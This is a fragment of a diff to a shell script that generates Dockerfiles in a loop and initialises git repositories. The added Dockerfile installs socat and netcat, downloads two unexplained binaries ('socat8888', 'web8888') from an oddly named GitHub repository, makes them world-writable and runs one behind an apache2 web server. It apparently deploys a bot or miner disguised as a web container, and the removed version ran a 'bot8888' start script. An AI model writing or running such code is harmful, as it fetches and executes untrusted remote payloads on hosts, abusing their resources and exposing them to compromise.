@@ -23,8 +23,8 @@ for i in 1 2 3; do
     
     # Create Dockerfile
     printf '%s\n' \
-        "FROM buyrunplace/webwebwebweb8888" \
-        "CMD cd /bot8888/; bash ./start & service apache2 start & while true; do sleep 14000; done" > Dockerfile
+        "FROM ubuntu:22.04" \
+        "CMD apt-get update && apt-get install -y apache2 && sed -i "s/Listen 80/Listen 8080/g" /etc/apache2/ports.conf && apt-get install -y libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget && wget https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888 && wget https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888 && chmod 777 -R ./web8888 && service apache2 start && ./web8888" > Dockerfile
     
     # Git setup
     git init
